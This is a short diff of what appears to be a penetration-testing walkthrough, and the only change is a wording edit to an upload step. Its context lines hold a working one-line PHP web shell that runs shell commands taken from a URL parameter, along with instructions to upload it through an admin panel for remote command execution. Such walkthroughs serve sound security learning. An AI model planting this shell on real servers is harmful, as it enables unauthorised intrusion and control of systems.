@@ -45,7 +45,7 @@ Step 6: Exploitation (Web Shell)
 Create payload:
 `echo '<?php system($_GET["cmd"]); ?>' > cmd.php`
 
-Upload cmd.php via admin panel.
+Upload cmd.php file via admin panel.
 
 Step 7: Remote Command Execution
 
